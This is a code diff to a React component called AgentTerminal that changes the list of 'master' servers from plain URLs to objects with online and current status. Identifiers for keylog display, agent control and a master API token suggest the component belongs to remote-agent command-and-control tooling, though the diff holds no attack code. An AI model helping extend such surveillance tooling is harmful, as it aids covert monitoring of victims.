@@ -40,7 +40,7 @@ export default function AgentTerminal({ agent, onClose }: Props) {
   const wpUploadRef = useRef<HTMLInputElement | null>(null)
   const [showKeylog, setShowKeylog] = useState(false)
   const [mastersOpen, setMastersOpen] = useState(false)
-  const [masters, setMasters] = useState<string[]>([])
+  const [masters, setMasters] = useState<Array<{ url: string; online?: boolean; current?: boolean }>>([])
   const apiBase = (import.meta as any).env?.VITE_MASTER_API_URL || 'http://localhost:9000'
   const token = (typeof localStorage !== 'undefined' ? localStorage.getItem('master_token') : null) || ''
 
@@ -58,8 +58,10 @@ export default function AgentTerminal({ agent, onClose }: Props) {
       try {
         if (line && line[0] === '{') {
           const obj = JSON.parse(line)
-          if (obj && obj.type === 'masters_list' && Array.isArray(obj.urls)) {
-            setMasters(obj.urls as string[])
+if (obj && obj.type === 'masters_list' && Array.isArray(obj.urls)) {
+            const st = (obj as any).status || {}
+            const cur = (obj as any).current || null
+            setMasters((obj.urls as string[]).map((u) => ({ url: u, online: !!st[u], current: cur === u })))
             return
           }
         }
